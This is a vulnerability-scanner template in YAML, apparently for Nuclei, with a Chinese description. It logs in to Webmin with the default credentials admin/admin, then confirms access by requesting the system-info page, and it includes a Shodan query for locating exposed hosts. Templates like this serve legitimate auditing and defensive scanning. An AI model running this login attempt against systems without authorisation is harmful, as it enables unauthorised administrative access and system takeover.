id: webmin-default-login

info:
  name: Webmin 默认口令登录（弱口令）
  author: pussycat0x
  severity: high
  description: |
    该模板通过尝试 Webmin 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://webmin.com/
    - https://doxfer.webmin.com/Webmin/Installing_Webmin
  classification:
    cwe-id: CWE-798
    cpe: cpe:2.3:a:webmin:webmin:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    shodan-query: title:"Webmin"
    product: webmin
    vendor: webmin
  tags: webmin,default-login,vuln

http:
  - raw:
      - |
        POST /session_login.cgi HTTP/1.1
        Host: {{Hostname}}
        Cookie: redirect=1; testing=1
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}
        Accept-Encoding: gzip, deflate

        user={{username}}&pass={{password}}
      - |
        GET /sysinfo.cgi HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: {{RootURL}}
        Accept-Encoding: gzip, deflate

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin
    host-redirects: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Webmin"
          - "Backup Configuration Files"
          - "Webmin Actions Log"
        condition: and

      - type: status
        status:
          - 200
